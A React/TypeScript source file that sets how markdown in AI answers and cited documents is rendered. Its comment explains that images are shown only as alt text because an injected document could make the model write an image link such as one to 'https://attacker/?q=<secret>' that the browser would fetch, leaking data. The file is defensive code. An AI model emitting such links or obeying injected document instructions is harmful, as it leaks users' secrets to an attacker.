import type { Components } from "react-markdown"
import type { Element, ElementContent } from "hast"

import { CodeBlock, CodeBlockContent } from "@/components/ui/code-block"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"

const textOf = (node: Element | ElementContent): string =>
  node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : ""

// What an answer and a cited document render alike. Never an image or raw HTML: a
// document could tell the model to write ![](https://attacker/?q=<secret>), and the
// browser would send it on its own. An image shows as its alt text, and HTML in the
// text is dropped (skipHtml). Tables as the app's own tables: wide ones scroll
// sideways inside their block, not the page. Fenced code as a plain Code Block (no
// highlighter: it would bring shiki).
export const MARKDOWN_BLOCKS: Components = {
  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
  table: ({ children }) => (
    <div className="my-3 rounded-lg border border-border/70 font-sans text-sm leading-normal">
      <Table>{children}</Table>
    </div>
  ),
  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
  tbody: ({ children }) => <TableBody>{children}</TableBody>,
  tr: ({ children }) => <TableRow>{children}</TableRow>,
  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
  pre: ({ node }) => (
    <CodeBlock size="sm" className="my-3">
      <CodeBlockContent>{node ? textOf(node).replace(/\n$/, "") : null}</CodeBlockContent>
    </CodeBlock>
  ),
}
